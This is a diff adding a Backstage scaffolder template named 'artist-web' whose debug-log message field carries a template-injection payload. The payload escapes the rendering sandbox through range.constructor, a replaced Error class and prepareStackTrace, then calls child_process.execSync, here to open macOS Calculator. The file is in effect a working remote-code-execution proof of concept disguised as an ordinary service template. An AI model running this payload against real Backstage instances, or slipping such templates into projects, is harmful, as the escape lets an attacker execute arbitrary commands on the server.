@@ -1,13 +1,23 @@
-${{
-range.constructor( 
-
-"this.env.__proto__.renderString = function() {
+apiVersion: chaitu.backstage.io/v1alpha1
+kind: Template
+metadata:
+  name: artist-web
+  description: The place to be, for great artists
+spec:
+  type: service
+  owner: artist-relations-team
+  
+  steps:
+    - id: log-message
+      name: Log Message
+      action: debug:log
+      input:
+        message: Hello ${{
+range.constructor("this.env.__proto__.renderString = function() {
 globalThis.OldError = globalThis.Error;
 globalThis.Error = class Error {};
 globalThis.Error.prepareStackTrace = (cs,trace) => {
 trace[2].getThis().process.mainModule.require(\"child_process\").execSync(\"
 System/Applications/Calculator.app/Contents/MacOs/Calculator\"); };
 const {stack} = new globalThis.OldError();}")().triggerException()
-
-
 }}
